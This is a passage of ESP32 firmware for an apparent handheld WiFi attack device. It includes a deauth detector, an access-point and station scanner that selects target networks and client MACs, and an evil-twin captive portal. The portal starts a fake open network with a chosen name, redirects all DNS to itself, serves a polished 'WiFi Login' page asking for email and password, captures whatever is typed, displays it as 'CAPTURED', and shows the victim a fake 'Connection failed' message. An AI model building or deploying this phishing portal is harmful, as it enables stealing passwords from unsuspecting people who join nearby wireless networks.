  esp_wifi_set_promiscuous_rx_cb(promiscuous_detector_cb);
  while (true) {
    if (readButtonOnce(BTN_OK)) {
      detecting = !detecting;
      if (detecting) {
        esp_wifi_set_promiscuous(true);
        tft.setTextColor(RED, BG);
        tft.setCursor(10, 115);
        tft.print(">>> DETECTING DEAUTH <<<");
      } else {
        esp_wifi_set_promiscuous(false);
        tft.fillRect(10, 115, 220, 20, BG);
      }
      delay(200);
    }
    if (readButtonOnce(BTN_UP)) break;
    if (detecting && deauthDetected) {
      tft.fillRect(10, 145, 220, 60, BG);
      tft.setTextColor(RED, BG);
      tft.setCursor(10, 145);
      tft.print("DEAUTH DETECTED!");
      tft.setTextColor(WHITE, BG);
      tft.setCursor(10, 165);
      tft.print(detectedDeauthInfo.substring(0, 40));
      deauthDetected = false;
    }
    delay(100);
  }
  esp_wifi_set_promiscuous(false);
  drawWiFiMenu();
}

void scanStations(uint8_t* ap_bssid, int channel, const char* ap_ssid) {
  tft.fillRect(0, 23, 240, 297, BG);
  drawStatusBarBright();
  tft.setTextColor(GREEN, BG);
  tft.setCursor(10, 35);
  tft.print("Scanning for stations on:");
  tft.setCursor(10, 55);
  tft.printf("%s (CH:%d)", ap_ssid, channel);
  tft.setCursor(10, 75);
  tft.print("Listening for 5 seconds...");

  stationMACs.clear();
  stationIPs.clear();
  stationHostnames.clear();

  esp_wifi_set_promiscuous_rx_cb(promiscuous_station_cb);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(true);
  delay(5000);
  esp_wifi_set_promiscuous(false);
  delay(100);

  tft.fillRect(0, 23, 240, 297, BG);
  drawStatusBarBright();
  tft.setTextColor(GREEN, BG);
  tft.setCursor(10, 35);
  tft.print("Stations found (max 8 shown):");

  int y = 65;
  int stationCount = (stationMACs.size() > 8) ? 8 : stationMACs.size();
  for (int i = 0; i < stationCount; i++) {
    tft.setTextColor(WHITE, BG);
    tft.setCursor(20, y);
    tft.printf("%d. %s", i+1, stationMACs[i].c_str());
    y += 25;
  }
  if (stationMACs.size() == 0) {
    tft.setCursor(20, 65);
    tft.print("No stations detected.");
  }

  tft.setCursor(10, y + 30);
  tft.print("OK: select station");
  tft.setCursor(10, y + 50);
  tft.print("LEFT: scan again");
  tft.setCursor(10, y + 70);
  tft.print("RIGHT: skip (no station)");

  int selection = 0;
  while (true) {
    if (readButtonOnce(BTN_RIGHT)) {
      target_station_mac = "";
      return;   // no station selected, go back to AP details
    }
    if (readButtonOnce(BTN_LEFT)) {
      // re-scan
      scanStations(ap_bssid, channel, ap_ssid);
      return;
    }
    if (readButtonOnce(BTN_DOWN) && stationCount > 0) {
      selection = (selection % stationCount) + 1;
      for (int i = 0; i < stationCount; i++) {
        tft.setTextColor((i+1 == selection) ? SELECT : WHITE, BG);
        tft.setCursor(20, 65 + i*25);
        tft.printf("%d. %s", i+1, stationMACs[i].c_str());
      }
    }
    if (readButtonOnce(BTN_OK) && selection > 0) {
      target_station_mac = stationMACs[selection-1];
      // show confirmation
      tft.fillRect(10, y + 70, 220, 20, BG);
      tft.setTextColor(YELLOW, BG);
      tft.setCursor(10, y + 70);
      tft.print("Station selected! Press OK");
      while (!readButtonOnce(BTN_OK)) delay(50);
      return;   // station saved, go back to AP details
    }
    delay(50);
  }
}
void showAPDetails(int apIndex, const char* ssid, uint8_t* bssid, int channel, int rssi, bool hasWPS) {
  tft.fillRect(0, 23, 240, 297, BG);
  drawStatusBarBright();

  tft.setTextColor(WHITE, BG);
  tft.setCursor(10, 35);
  tft.print("AP Details");

  tft.setTextColor(GREEN, BG);
  tft.setCursor(10, 55);
  tft.printf("SSID: %s", ssid);
  tft.setCursor(10, 75);
  tft.printf("Channel: %d", channel);
  tft.setCursor(10, 95);
  tft.printf("Signal: %d dBm", rssi);
  tft.setCursor(10, 115);
  char macStr[18];
  sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
  tft.printf("BSSID: %s", macStr);
  tft.setCursor(10, 135);
  tft.printf("WPS: %s", hasWPS ? "Yes" : "No");

  // Live packet monitor (2 seconds)
  tft.setCursor(10, 160);
  tft.print("Live packets (2s)...");
  esp_wifi_set_promiscuous_rx_cb(promiscuous_cb);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(true);
  monitorRunning = true;
  packetCount = 0;
  delay(2000);
  monitorRunning = false;
  esp_wifi_set_promiscuous(false);
  tft.fillRect(10, 180, 220, 20, BG);
  tft.setCursor(10, 180);
  tft.printf("Packets seen: %lu", packetCount);

  tft.setCursor(10, 210);
  tft.print("OK: Scan stations");
  tft.setCursor(10, 230);
  tft.print("LEFT: Back to AP list");

  while (true) {
    if (readButtonOnce(BTN_OK)) {
      scanStations(bssid, channel, ssid);
      // After station scan, redraw this details screen again
      showAPDetails(apIndex, ssid, bssid, channel, rssi, hasWPS);
      break;
    }
    if (readButtonOnce(BTN_LEFT)) {
      return;   // go back to AP list
    }
    delay(50);
  }
}

void runWiFiScanner() {
  stationMACs.clear();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  while (true) {   // outer loop for re-entering after AP details
    tft.fillRect(0, 23, 240, 297, BG);
    drawStatusBarBright();
    tft.setTextColor(GREEN, BG);
    tft.setCursor(10, 35);
    tft.print("WiFi Scanner - Scanning APs...");

    int n = WiFi.scanNetworks();
    if (n == 0) {
      tft.setTextColor(RED, BG);
      tft.setCursor(10, 60);
      tft.print("No networks found!");
      delay(2000);
      drawWiFiMenu();
      return;
    }

    tft.fillRect(0, 23, 240, 297, BG);
    drawStatusBarBright();
    tft.setTextColor(GREEN, BG);
    tft.setCursor(10, 35);
    tft.print("Select Target AP (or Back):");

    int total_aps = (n > 8) ? 8 : n;   // leave room for Back item
    int selected_ap = 0;
    bool backSelected = false;

    while (true) {
      // Draw AP list
      for (int i = 0; i < total_aps; i++) {
        int y = 65 + i * 20;
        tft.setTextColor((i == selected_ap) ? SELECT : GREEN, BG);
        tft.setCursor(20, y);
        tft.printf("%d. %s", i+1, WiFi.SSID(i).c_str());
      }
      // Draw "Back to WiFi Menu" at the bottom
      int backY = 65 + total_aps * 20 + 10;
      tft.setTextColor((selected_ap == total_aps) ? SELECT : GREEN, BG);
      tft.setCursor(20, backY);
      tft.print("X. Back to WiFi Menu");

      // Button handling
      if (readButtonOnce(BTN_UP)) {
        selected_ap--;
        if (selected_ap < 0) selected_ap = total_aps;   // wrap to Back item
        delay(150);
      }
      if (readButtonOnce(BTN_DOWN)) {
        selected_ap++;
        if (selected_ap > total_aps) selected_ap = 0;
        delay(150);
      }
      if (readButtonOnce(BTN_OK)) {
        if (selected_ap == total_aps) {
          // Back to WiFi menu
          WiFi.scanDelete();
          drawWiFiMenu();
          return;
        } else {
          // Save AP info and show details
          target_ssid = WiFi.SSID(selected_ap);
          target_channel = WiFi.channel(selected_ap);
          memcpy(target_bssid, WiFi.BSSID(selected_ap), 6);
          int rssi = WiFi.RSSI(selected_ap);
          bool hasWPS = false;   // optional detection
          showAPDetails(selected_ap, target_ssid.c_str(), target_bssid, target_channel, rssi, hasWPS);
          // After returning from AP details, break out of this inner loop to rescan
          break;
        }
      }
      delay(50);
    }
    // Rescan after returning from AP details (refresh list)
    WiFi.scanDelete();
    delay(200);
  }
}
void handleRoot() {
  String html = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .login-container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
            overflow: hidden;
            width: 100%;
            max-width: 400px;
            animation: fadeIn 0.5s ease-out;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        .header h1 {
            font-size: 28px;
            margin-bottom: 10px;
        }
        .header p {
            opacity: 0.9;
            font-size: 14px;
        }
        .form-content {
            padding: 30px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        .input-group label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 600;
            font-size: 14px;
        }
        .input-group input {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.3s ease;
        }
        .input-group input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102,126,234,0.1);
        }
        button {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        button:hover {
            transform: translateY(-2px);
        }
        .footer {
            text-align: center;
            padding: 20px;
            background: #f8f9fa;
            color: #666;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="header">
            <h1>WiFi Login</h1>
            <p>Please authenticate to continue</p>
        </div>
        <div class="form-content">
            <form method="POST" action="/login">
                <div class="input-group">
                    <label>Email or Username</label>
                    <input type="text" name="email" placeholder="Enter your email" required>
                </div>
                <div class="input-group">
                    <label>Password</label>
                    <input type="password" name="pass" placeholder="Enter your password" required>
                </div>
                <button type="submit">Connect</button>
            </form>
        </div>
        <div class="footer">
            <p>This Wi-Fi network requires authentication</p>
        </div>
    </div>
</body>
</html>
)rawliteral";
  server.send(200, "text/html", html);
}

void handleLogin() {
  if (server.hasArg("email") && server.hasArg("pass")) {
    capturedCredentials = "Email: " + server.arg("email") + " | Pass: " + server.arg("pass");
    server.send(200, "text/html", "<!DOCTYPE html><html><head><title>Error</title></head><body style='font-family:Arial;text-align:center;padding:50px;'><h2>Connection failed</h2><p>Please try again later.</p></body></html>");
  } else {
    server.send(400, "text/html", "Bad request");
  }
}

// -------- Button‑controlled on‑screen keyboard ----------
String getCustomSSID() {
  const char* keyboardRows[] = {
    "ABCDEFGHIJKLM",
    "NOPQRSTUVWXYZ",
    "abcdefghijklm",
    "nopqrstuvwxyz",
    "0123456789_- ",
    "BACKSPACE",
    "DONE"
  };
  int rowCount = 7;
  int keyW = 16, keyH = 20, startX = 10, startY = 70, spacing = 2;

  String input = "";
  int selectedRow = 0;
  int selectedCol = 0;

  auto draw = [&]() {
    tft.fillRect(0, 23, 240, 297, BG);
    drawStatusBarBright();
    tft.setTextColor(WHITE, BG);
    tft.setCursor(10, 40);
    tft.print("Enter Custom SSID:");
    tft.fillRect(10, 55, 220, 25, TILE);
    tft.drawRect(10, 55, 220, 25, BORDER);
    tft.setTextColor(WHITE, TILE);
    tft.setCursor(15, 62);
    tft.print(input);
    for (int r = 0; r < rowCount; r++) {
      int y = startY + r * (keyH + spacing);
      int x = startX;
      const char* keys = keyboardRows[r];
      int len = strlen(keys);
      for (int c = 0; c < len; c++) {
        uint16_t bg = (r == selectedRow && c == selectedCol) ? SELECT : TILE;
        uint16_t txt = (r == selectedRow && c == selectedCol) ? BG : WHITE;
        tft.fillRect(x, y, keyW, keyH, bg);
        tft.drawRect(x, y, keyW, keyH, BORDER);
        tft.setTextColor(txt, bg);
        tft.setCursor(x + 3, y + 4);
        tft.print(keys[c]);
        x += keyW + spacing;
      }
    }
  };

  draw();

  while (true) {
    if (readButtonOnce(BTN_UP)) {
      selectedRow = (selectedRow - 1 + rowCount) % rowCount;
      selectedCol = 0;
      draw();
      delay(150);
    }
    if (readButtonOnce(BTN_DOWN)) {
      selectedRow = (selectedRow + 1) % rowCount;
      selectedCol = 0;
      draw();
      delay(150);
    }
    if (readButtonOnce(BTN_LEFT)) {
      int len = strlen(keyboardRows[selectedRow]);
      if (len > 0) selectedCol = (selectedCol - 1 + len) % len;
      draw();
      delay(150);
    }
    if (readButtonOnce(BTN_RIGHT)) {
      int len = strlen(keyboardRows[selectedRow]);
      if (len > 0) selectedCol = (selectedCol + 1) % len;
      draw();
      delay(150);
    }
    if (readButtonOnce(BTN_OK)) {
      const char* keys = keyboardRows[selectedRow];
      if (selectedRow == 5) { // BACKSPACE
        if (input.length() > 0) input.remove(input.length() - 1);
      } else if (selectedRow == 6) { // DONE
        if (input.length() > 0) return input;
        else return "Free_WiFi"; // fallback if empty
      } else {
        char c = keys[selectedCol];
        if (input.length() < 25) input += c;
      }
      draw();
      delay(150);
    }
  }
}

void runCaptivePortal() {
  // Ask user for custom SSID
  String customSSID = getCustomSSID();
  const char* fakeSSID = customSSID.c_str();
  WiFi.softAP(fakeSSID);
  delay(100);
  dnsServer.start(53, "*", WiFi.softAPIP());
  server.on("/", handleRoot);
  server.on("/login", handleLogin);
  server.begin();
  tft.fillRect(0, 23, 240, 297, BG);
  drawStatusBarBright();
  tft.setTextColor(GREEN, BG);
  tft.setCursor(10, 35);
  tft.print("Captive Portal Active");
  tft.setCursor(10, 55);
  tft.printf("SSID: %s", fakeSSID);
  tft.setCursor(10, 75);
  tft.print("IP: " + WiFi.softAPIP().toString());
  tft.setCursor(10, 105);
  tft.print("Waiting for credentials...");
  tft.setCursor(10, 135);
  tft.print("Press OK to stop");
  capturedCredentials = "";
  while (true) {
    dnsServer.processNextRequest();
    server.handleClient();
    if (capturedCredentials != "") {
      tft.fillRect(10, 165, 220, 40, BG);
      tft.setTextColor(RED, BG);
      tft.setCursor(10, 165);
      tft.print("CAPTURED:");
      tft.setTextColor(WHITE, BG);
      tft.setCursor(10, 185);
      tft.print(capturedCredentials);
    }
    if (readButtonOnce(BTN_OK)) break;
    delay(10);
  }
  server.stop();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  drawWiFiMenu();
}

#endif